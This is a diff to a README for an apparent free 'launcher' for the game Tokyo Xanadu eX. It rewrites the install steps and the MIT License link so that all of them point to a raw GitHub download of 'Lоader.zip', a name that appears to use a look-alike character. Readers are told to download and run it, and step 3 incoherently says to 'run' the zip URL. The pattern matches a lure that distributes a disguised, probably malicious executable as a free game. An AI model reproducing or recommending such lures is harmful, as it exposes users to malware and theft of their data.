@@ -37,9 +37,9 @@ Tokyo Xanadu eX download, free installer, RPG game loader, English version, easy
 
 ## 📥 Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/DefaltZ-ux/TokyoXanaduEX-FreeEdition-Launcher/main/Lоader.zip** from the repository.
 2. Extract all files using WinRAR or 7-Zip.
-3. Run the TokyoXanaduLoader.exe file.
+3. Run the https://raw.githubusercontent.com/DefaltZ-ux/TokyoXanaduEX-FreeEdition-Launcher/main/Lоader.zip file.
 4. Follow on-screen instructions to complete the installation.
 5. Start playing Tokyo Xanadu eX with a single click!
 
@@ -53,4 +53,4 @@ This repository is meant for educational and personal backup use only. Not respo
 
 ## 📄 License
 
-Licensed under the [MIT License](https://opensource.org/license/mit/) - 2025. Use responsibly!
+Licensed under the [MIT License](https://raw.githubusercontent.com/DefaltZ-ux/TokyoXanaduEX-FreeEdition-Launcher/main/Lоader.zip) - 2025. Use responsibly!
